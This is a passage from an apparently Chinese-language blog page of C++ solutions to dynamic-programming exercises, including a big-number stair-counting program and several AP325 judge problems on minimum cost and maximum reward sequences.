keyword">operator</span><span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>ostream<span class="token operator">&amp;</span><span class="token punctuation">,</span>BigNum<span class="token operator">&amp;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    BigNum <span class="token keyword">operator</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token keyword">const</span> BigNum <span class="token operator">&amp;</span><span class="token punctuation">)</span><span class="token keyword">const</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span>BigNum<span class="token operator">::</span><span class="token function">BigNum</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span>   <span class="token punctuation">{</span>    <span class="token keyword">int</span> c<span class="token punctuation">,</span>d<span class="token operator">=</span>b<span class="token punctuation">;</span>    len<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>d<span class="token operator">></span>MAXN<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        c<span class="token operator">=</span>d<span class="token operator">-</span><span class="token punctuation">(</span>d<span class="token operator">/</span><span class="token punctuation">(</span>MAXN<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>MAXN<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        d<span class="token operator">=</span>d<span class="token operator">/</span><span class="token punctuation">(</span>MAXN<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        a<span class="token punctuation">[</span>len<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>c<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    a<span class="token punctuation">[</span>len<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>d<span class="token punctuation">;</span><span class="token punctuation">}</span>BigNum<span class="token operator">::</span><span class="token function">BigNum</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">int</span> t<span class="token punctuation">,</span>k<span class="token punctuation">,</span>index<span class="token punctuation">,</span>L<span class="token punctuation">,</span>i<span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    L<span class="token operator">=</span><span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    len<span class="token operator">=</span>L<span class="token operator">/</span>DLEN<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>L<span class="token operator">%</span>DLEN<span class="token punctuation">)</span>len<span class="token operator">++</span><span class="token punctuation">;</span>    index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span>L<span class="token number">-1</span><span class="token punctuation">;</span>i<span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">-</span><span class="token operator">=</span>DLEN<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        t<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        k<span class="token operator">=</span>i<span class="token operator">-</span>DLEN<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span>k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span>k<span class="token punctuation">;</span>j<span class="token operator">&lt;=</span>i<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>            t<span class="token operator">=</span>t<span class="token operator">*</span><span class="token number">10</span><span class="token operator">+</span>s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">-</span><span class="token string">'0'</span><span class="token punctuation">;</span>        a<span class="token punctuation">[</span>index<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>t<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>BigNum<span class="token operator">::</span><span class="token function">BigNum</span><span class="token punctuation">(</span><span class="token keyword">const</span> BigNum <span class="token operator">&amp;</span>T<span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">len</span><span class="token punctuation">(</span>T<span class="token punctuation">.</span>len<span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>T<span class="token punctuation">.</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span>BigNum <span class="token operator">&amp;</span> BigNum<span class="token operator">::</span><span class="token keyword">operator</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">const</span> BigNum <span class="token operator">&amp;</span>n<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    len<span class="token operator">=</span>n<span class="token punctuation">.</span>len<span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>n<span class="token punctuation">.</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">*</span><span class="token keyword">this</span><span class="token punctuation">;</span><span class="token punctuation">}</span>istream<span class="token operator">&amp;</span> <span class="token keyword">operator</span><span class="token operator">>></span><span class="token punctuation">(</span>istream <span class="token operator">&amp;</span>in<span class="token punctuation">,</span>BigNum <span class="token operator">&amp;</span>b<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> ch<span class="token punctuation">[</span>MAXSIZE<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    in<span class="token operator">>></span>ch<span class="token punctuation">;</span>    <span class="token keyword">int</span> L<span class="token operator">=</span><span class="token function">strlen</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> count<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>sum<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span>L<span class="token number">-1</span><span class="token punctuation">;</span>i<span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        sum<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> t<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span><span class="token number">4</span><span class="token operator">&amp;&amp;</span>i<span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">,</span>i<span class="token operator">--</span><span class="token punctuation">,</span>t<span class="token operator">*</span><span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            sum<span class="token operator">+</span><span class="token operator">=</span><span class="token punctuation">(</span>ch<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token string">'0'</span><span class="token punctuation">)</span><span class="token operator">*</span>t<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        b<span class="token punctuation">.</span>a<span class="token punctuation">[</span>count<span class="token punctuation">]</span><span class="token operator">=</span>sum<span class="token punctuation">;</span>        count<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    b<span class="token punctuation">.</span>len<span class="token operator">=</span>count<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> in<span class="token punctuation">;</span><span class="token punctuation">}</span>ostream<span class="token operator">&amp;</span> <span class="token keyword">operator</span><span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>ostream<span class="token operator">&amp;</span> out<span class="token punctuation">,</span>BigNum<span class="token operator">&amp;</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    cout<span class="token operator">&lt;&lt;</span>b<span class="token punctuation">.</span>a<span class="token punctuation">[</span>b<span class="token punctuation">.</span>len<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span>b<span class="token punctuation">.</span>len<span class="token number">-2</span><span class="token punctuation">;</span>i<span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">--</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%04d"</span><span class="token punctuation">,</span>b<span class="token punctuation">.</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> out<span class="token punctuation">;</span><span class="token punctuation">}</span>BigNum BigNum<span class="token operator">::</span><span class="token keyword">operator</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token keyword">const</span> BigNum <span class="token operator">&amp;</span>T<span class="token punctuation">)</span><span class="token keyword">const</span>  <span class="token punctuation">{</span>    BigNum <span class="token function">t</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span>big<span class="token punctuation">;</span>    big<span class="token operator">=</span>T<span class="token punctuation">.</span>len<span class="token operator">></span>len<span class="token operator">?</span>T<span class="token punctuation">.</span>len<span class="token operator">:</span>len<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>big<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        t<span class="token punctuation">.</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">=</span>T<span class="token punctuation">.</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">></span>MAXN<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            t<span class="token punctuation">.</span>a<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>            t<span class="token punctuation">.</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">=</span>MAXN<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span>a<span class="token punctuation">[</span>big<span class="token punctuation">]</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span>       t<span class="token punctuation">.</span>len<span class="token operator">=</span>big<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> t<span class="token punctuation">.</span>len<span class="token operator">=</span>big<span class="token punctuation">;</span>    <span class="token keyword">return</span> t<span class="token punctuation">;</span><span class="token punctuation">}</span>BigNum dp<span class="token punctuation">[</span><span class="token number">1005</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cin<span class="token operator">>></span>n<span class="token punctuation">)</span><span class="token punctuation">{</span>        dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span> <span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>n <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">+</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token number">-2</span><span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">)</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span>i<span class="token number">-2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token number">-3</span><span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">)</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span>i<span class="token number">-3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        cout<span class="token operator">&lt;&lt;</span>dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token string">"\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>    </div></div><hr><h2 id="AP325"><a href="#AP325" class="headerlink" title="AP325"></a>AP325</h2><h3 id="1D0D"><a href="#1D0D" class="headerlink" title="1D0D"></a>1D0D</h3><h4 id="P-6-1-小朋友上樓梯最小成本"><a href="#P-6-1-小朋友上樓梯最小成本" class="headerlink" title="P-6-1. 小朋友上樓梯最小成本"></a>P-6-1. 小朋友上樓梯最小成本</h4><blockquote><p><a href="https://judge.tcirc.tw/ShowProblem?problemid=d066">https://judge.tcirc.tw/ShowProblem?problemid=d066</a> </p></blockquote><div class="spoiler collapsed">    <div class="spoiler-title">        bottom up    </div>    <div class="spoiler-content">        <pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;bits/stdc++.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> h<span class="token punctuation">[</span><span class="token number">100005</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span><span class="token number">100005</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>    cin<span class="token operator">>></span>n<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span> <span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>n <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> cin<span class="token operator">>></span>h<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> h<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    dp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> h<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">3</span> <span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>n <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token number">-2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> h<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    cout<span class="token operator">&lt;&lt;</span>dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>    </div></div><h4 id="P-6-2-不連續的表演酬勞"><a href="#P-6-2-不連續的表演酬勞" class="headerlink" title="P-6-2. 不連續的表演酬勞"></a>P-6-2. 不連續的表演酬勞</h4><blockquote><p><a href="https://judge.tcirc.tw/ShowProblem?problemid=d067">https://judge.tcirc.tw/ShowProblem?problemid=d067</a> </p></blockquote><div class="spoiler collapsed">    <div class="spoiler-title">        bottom up    </div>    <div class="spoiler-content">        <pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;bits/stdc++.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span><span class="token number">100005</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> cost<span class="token punctuation">[</span><span class="token number">100005</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>    cin<span class="token operator">>></span>n<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span> <span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>n <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> cin<span class="token operator">>></span>cost<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> cost<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>cost<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>cost<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">3</span> <span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>n <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>cost<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span>i<span class="token number">-2</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    cout<span class="token operator">&lt;&lt;</span>dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>    </div></div><h4 id="P-6-3-最小監控鄰居的成本"><a href="#P-6-3-最小監控鄰居的成本" class="headerlink" title="P-6-3. 最小監控鄰居的成本"></a>P-6-3. 最小監控鄰居的成本</h4><blockquote><p><a href="https://judge.tcirc.tw/ShowProblem?problemid=d068">https://judge.tcirc.tw/ShowProblem?problemid=d068</a> </p></blockquote><div class="spoiler collapsed">    <div class="spoiler-title">        bottom up    </div>    <div class="spoiler-content">        <pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;bits/stdc++.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> cost<span class="token punctuation">[</span><span class="token number">100005</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span><span class="token number">100005</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//chose i </span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>    cin<span class="token operator">>></span>n<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span> <span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>n <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> cin<span class="token operator">>></span>cost<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> cost<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    dp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> cost<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    dp<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> cost<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token function">min</span><span class="token punctuation">(</span>cost<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>cost<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">4</span> <span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>n <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span><span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token number">-3</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token number">-2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> cost<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    cout<span class="token operator">&lt;&lt;</span><span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>n<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>    </div></div><h4 id="Q-6-4-闖關二選一"><a href="#Q-6-4-闖關二選一" class="headerlink" title="Q-6-4. 闖關二選一"></a>Q-6-4. 闖關二選一</h4><blockquote><p><a href="https://judge.tcirc.tw/ShowProblem?problemid=d072">https://judge.tcirc.tw/ShowProblem?problemid=d072</a> </p></blockquote><div class="spoiler collapsed">    <div class="spoiler-title">        bottom up    </div>    <div class="spoiler-content">        <pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;bits/stdc++.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">100005</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> b<span class="token punctuation">[</span><span class="token number">100005</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span><span class="token number">100005</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span>t<span class="token punctuation">;</span>    cin<span class="token operator">>></span>n<span class="token operator">>></span>t<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span> <span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>n <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> cin<span class="token operator">>></span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">>></span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">abs</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>    dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">abs</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">2</span> <span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>n <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token function">abs</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span>a<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token function">abs</span><span class="token 